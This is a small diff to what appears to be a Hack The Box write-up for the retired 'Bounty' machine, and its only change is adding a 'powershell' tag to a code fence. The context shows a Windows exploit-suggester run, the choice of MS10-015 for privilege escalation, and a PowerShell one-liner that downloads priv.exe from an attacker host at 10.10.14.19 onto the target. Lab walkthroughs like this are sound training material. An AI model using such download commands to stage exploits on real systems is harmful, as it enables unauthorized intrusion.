@@ -191,7 +191,7 @@ root@kali:~/HTB/retired/bounty# python wes.py --database 2020-01-26-mssb.xls --s
 
 select ms10-015 to try escalation...not listed here...but does work...I've used it recently and I've got it readily to hand.
 
-```
+```powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.19/priv.exe','C:\boo\priv.exe')"
 ```
 
